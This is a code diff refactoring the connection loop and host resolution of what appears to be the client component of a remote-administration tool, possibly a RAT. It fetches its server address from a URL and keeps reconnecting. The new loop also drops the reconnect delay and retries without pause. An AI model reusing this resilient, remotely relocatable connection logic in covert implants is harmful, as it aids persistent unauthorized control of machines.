@@ -46,6 +46,9 @@ namespace Pulsar.Client.Networking
         /// </summary>
         private readonly CancellationToken _token;
 
+        // Store the last resolved host (IP and Port)
+        private Host _lastResolvedHost;
+
         /// <summary>
         /// Initializes a new instance of the <see cref="PulsarClient"/> class.
         /// </summary>
@@ -66,176 +69,144 @@ namespace Pulsar.Client.Networking
         /// <summary>
         /// Connection loop used to reconnect and keep the connection open.
         /// </summary>
-
-
-
-
-
-public void ConnectLoop()
-    {
-        Random random = new Random();
-
-        while (!_token.IsCancellationRequested)
+        public void ConnectLoop()
         {
-            if (!Connected)
+            while (!_token.IsCancellationRequested)
             {
-                Host host = null;
-                string hostString = Settings.HOSTS;
+                if (!Connected)
+                {
+                    Host host = null;
+                    string hostString = Settings.HOSTS;
 
-                if (!string.IsNullOrEmpty(hostString))
-                {
-                    host = ResolveHost(hostString);
+                    if (!string.IsNullOrEmpty(hostString))
+                    {
+                        host = ResolveHost(hostString);
+                    }
+
+                    if (host == null)
+                    {
+                        host = _hosts.GetNextHost();
+                    }
+
+                    try
+                    {
+                        base.Connect(host.IpAddress, host.Port);
+
+                        if (!Connected)
+                        {
+                            continue;
+                        }
+                    }
+                    catch (Exception ex)
+                    {
+                        Debug.WriteLine($"Connection error: {ex.Message}");
+                        continue;
+                    }
                 }
 
-                if (host == null)
+                while (Connected && !_token.IsCancellationRequested)
                 {
-                    host = _hosts.GetNextHost();
+                    try
+                    {
+                        _token.WaitHandle.WaitOne(250);
+                    }
+                    catch (Exception ex) when (ex is NullReferenceException || ex is ObjectDisposedException)
+                    {
+                        Disconnect();
+                        return;
+                    }
                 }
 
-                try
-                {
-                    base.Connect(host.IpAddress, host.Port);
-                }
-                catch (Exception)
-                {
-                }
-            }
-
-            while (Connected)
-            {
-                try
-                {
-                    _token.WaitHandle.WaitOne(1000);
-                }
-                catch (Exception ex) when (ex is NullReferenceException || ex is ObjectDisposedException)
+                if (_token.IsCancellationRequested)
                 {
                     Disconnect();
                     return;
                 }
             }
-
-            if (_token.IsCancellationRequested)
-            {
-                Disconnect();
-                return;
-            }
-
-            int delay = Settings.RECONNECTDELAY + random.Next(250, 750);
-            Thread.Sleep(delay);
         }
-    }
 
-    private Host ResolveHost(string hostString)
-    {
-        if (Uri.TryCreate(hostString, UriKind.Absolute, out Uri uri))
+        /// <summary>
+        /// Keeps only one ResolveHost method with logging capabilities
+        /// </summary>
+        private Host ResolveHost(string hostString)
         {
             try
             {
-                WebRequest request = WebRequest.Create(uri);
-                request.Timeout = 10000;
-                using (WebResponse response = request.GetResponse())
-                using (Stream stream = response.GetResponseStream())
-                using (StreamReader reader = new StreamReader(stream))
+                if (Uri.TryCreate(hostString, UriKind.Absolute, out Uri uri))
                 {
-                    string content = reader.ReadToEnd().Trim();
-
-                    if (Uri.TryCreate(content, UriKind.Absolute, out Uri nestedUri))
+                    try
                     {
-                        return ResolveHost(content);
+                        WebRequest request = WebRequest.Create(uri);
+                        request.Timeout = 5000;
+                        using (WebResponse response = request.GetResponse())
+                        using (Stream stream = response.GetResponseStream())
+                        using (StreamReader reader = new StreamReader(stream))
+                        {
+                            string content = reader.ReadToEnd().Trim();
+                            Debug.WriteLine($"Fetched from URI: '{content}'");
+
+                            if (Uri.TryCreate(content, UriKind.Absolute, out Uri nestedUri))
+                            {
+                                return ResolveHost(content); 
+                            }
+
+                            string[] parts = content.Split(':');
+                            if (parts.Length >= 2 &&
+                                IPAddress.TryParse(parts[0].Trim(), out IPAddress ip) &&
+                                ushort.TryParse(parts[1].Trim(), out ushort port))
+                            {
+                                Debug.WriteLine($"Parsed IP: {ip}, Port: {port}");
+                                _lastResolvedHost = new Host { IpAddress = ip, Port = port };
+                                return _lastResolvedHost;
+                            }
+                            else
+                            {
+                                Debug.WriteLine($"Failed to parse URI response: '{content}'");
+                            }
+                        }
                     }
-
-                    string[] parts = content.Split(':');
-                    if (parts.Length >= 2 &&
-                        IPAddress.TryParse(parts[0].Trim(), out IPAddress ip) &&
-                        ushort.TryParse(parts[1].Trim(), out ushort port))
+                    catch (Exception ex)
                     {
-                        return new Host { IpAddress = ip, Port = port };
+                        Debug.WriteLine($"URI fetch error: {ex.Message}");
                     }
                 }
-            }
-            catch (Exception)
-            {
-            }
-        }
-        else
-        {
-            string[] parts = hostString.Split(':');
-            if (parts.Length >= 2 &&
-                IPAddress.TryParse(parts[0].Trim(), out IPAddress ip) &&
-                ushort.TryParse(parts[1].Trim(), out ushort port))
-            {
-                return new Host { IpAddress = ip, Port = port };
-            }
-        }
-        return null;
-    }
-    private Host ResolveHost(string hostString, string logFile)
-    {
-        if (Uri.TryCreate(hostString, UriKind.Absolute, out Uri uri))
-        {
-            try
-            {
-                WebRequest request = WebRequest.Create(uri);
-                request.Timeout = 10000;
-                using (WebResponse response = request.GetResponse())
-                using (Stream stream = response.GetResponseStream())
-                using (StreamReader reader = new StreamReader(stream))
+                else
                 {
-                    string content = reader.ReadToEnd().Trim();
-                    File.AppendAllText(logFile, $"{DateTime.Now}: Fetched from URI: '{content}'\n");
-
-                    if (Uri.TryCreate(content, UriKind.Absolute, out Uri nestedUri))
-                    {
-                        return ResolveHost(content, logFile); // Recursive fetch if content is a URL
-                    }
-
-                    string[] parts = content.Split(':');
+                    string[] parts = hostString.Split(':');
                     if (parts.Length >= 2 &&
                         IPAddress.TryParse(parts[0].Trim(), out IPAddress ip) &&
                         ushort.TryParse(parts[1].Trim(), out ushort port))
                     {
-                        File.AppendAllText(logFile, $"{DateTime.Now}: Parsed IP: {ip}, Port: {port}\n");
-                        return new Host { IpAddress = ip, Port = port };
+                        Debug.WriteLine($"Parsed direct IP: {ip}, Port: {port}");
+                        _lastResolvedHost = new Host { IpAddress = ip, Port = port };
+                        return _lastResolvedHost;
                     }
                     else
                     {
-                        File.AppendAllText(logFile, $"{DateTime.Now}: Failed to parse URI response: '{content}'\n");
+                        Debug.WriteLine($"Invalid hostString format: '{hostString}'");
                     }
                 }
             }
             catch (Exception ex)
             {
-                File.AppendAllText(logFile, $"{DateTime.Now}: URI fetch error: {ex.Message}\n");
+                Debug.WriteLine($"Host resolution error: {ex.Message}");
             }
-        }
-        else
-        {
-            string[] parts = hostString.Split(':');
-            if (parts.Length >= 2 &&
-                IPAddress.TryParse(parts[0].Trim(), out IPAddress ip) &&
-                ushort.TryParse(parts[1].Trim(), out ushort port))
+            if (_lastResolvedHost != null)
             {
-                File.AppendAllText(logFile, $"{DateTime.Now}: Parsed direct IP: {ip}, Port: {port}\n");
-                return new Host { IpAddress = ip, Port = port };
+                Debug.WriteLine($"Using last resolved host: {_lastResolvedHost.IpAddress}:{_lastResolvedHost.Port}");
+                return _lastResolvedHost;
             }
-            else
-            {
-                File.AppendAllText(logFile, $"{DateTime.Now}: Invalid hostString format: '{hostString}'\n");
-            }
+            return null;
         }
-        return null;
-    }
 
 
-
-
-    private void OnClientRead(Client client, IMessage message, int messageLength)
+        private void OnClientRead(Client client, IMessage message, int messageLength)
         {
             if (!_identified)
             {
                 if (message.GetType() == typeof(ClientIdentificationResult))
                 {
-                    var reply = (ClientIdentificationResult) message;
+                    var reply = (ClientIdentificationResult)message;
                     _identified = reply.Result;
                 }
                 return;
@@ -246,7 +217,7 @@ public void ConnectLoop()
 
         private void OnClientFail(Client client, Exception ex)
         {
-            Debug.WriteLine("Client Fail - Exception Message: " + ex.Message);
+            Debug.WriteLine("Client Failed: " + ex.Message);
             client.Disconnect();
         }
 
